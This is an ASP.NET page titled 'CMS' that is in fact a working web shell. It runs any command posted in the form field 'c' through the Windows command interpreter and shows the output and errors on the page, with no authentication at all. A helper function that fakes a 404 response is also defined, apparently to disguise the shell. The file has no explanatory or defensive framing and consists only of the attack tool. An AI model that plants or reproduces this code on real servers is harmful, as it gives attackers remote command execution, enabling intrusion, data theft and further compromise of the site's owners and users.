<%@ Page Language="C#"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    string outstd = "";
    string errstd = "";
    void kill() {
        HttpContext.Current.Response.StatusCode = 404;
        HttpContext.Current.Response.StatusDescription = "1";
        HttpContext.Current.Response.Write("<h1>1</h1>");
        HttpContext.Current.Server.ClearError();
        HttpContext.Current.Response.End();
    }

    void Page_Load(object sender, System.EventArgs e) {
        if (Request.Form["c"] != null) {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + Request.Form["c"]);
            procStartInfo.RedirectStandardError = true;
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.UseShellExecute = false;
            Process p = new Process();
            p.StartInfo = procStartInfo;
            p.Start();
            outstd = p.StandardOutput.ReadToEnd();
            errstd = p.StandardError.ReadToEnd();
        }
    }
</script>

<html>
    <head>
        <title>CMS</title>
    </head>
    <body onload="document.cms.c.focus()">
        <form method="post" name="cms">
            <input type="text" name="c"/>
            <input type="submit"><br/>
            OUT:<br/>
            <pre><% = outstd.Replace("<", "&lt;") %></pre>
            <br/>
            <br/>
            <br/>
            ERR:<br/>
            <pre><% = errstd.Replace("<", "&lt;") %></pre>
        </form>
    </body>
</html>